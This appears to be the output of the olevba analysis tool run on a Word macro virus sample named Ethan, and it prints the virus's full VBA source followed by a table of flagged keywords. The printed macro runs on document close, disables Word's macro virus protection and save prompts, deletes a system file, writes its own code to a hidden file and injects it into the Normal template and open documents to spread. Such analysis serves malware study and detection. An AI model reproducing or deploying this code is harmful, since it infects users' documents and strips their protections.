olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-da1cee0623ace15732007ac95f7d3c63dea0ae16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-da1cee0623ace15732007ac95f7d3c63dea0ae16 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

Dim KillName$
KillName$ = "C:\class.sys"
If Dir(KillName) <> "" Then Kill KillName
If Dir("c:\Brigl.sys") <> "" Then Kill "c:\class.sys"

s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

Randomize
If Dir("c:\_____.___", 6) = "" Then
    Open "c:\_____.___" For Output As #1
    For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    Print #1, a
    Next i
    Close #1
    SetAttr "c:\_____.___", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
    t = ""
End If

If t <> "" Then
    Open "c:\_____.___" For Input As #1
    If LOF(1) = 0 Then GoTo q
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        t.CodeModule.InsertLines i, a
        i = i + 1
    Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub CommandButton1_Click()
On Error Resume Next
If MsgBox("Send form to Personnel?", vbOKCancel, Timesheet) = vbOK Then
    MsgBox "Please remember to type ""Personnel UK"" in the to field of the mail message which will appear next"
    SendForm
ActiveDocument.Close (wdDoNotSaveChanges)
End If
End Sub

Private Sub CommandButton2_Click()
SaveDoc
End Sub

Private Sub Document_New()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
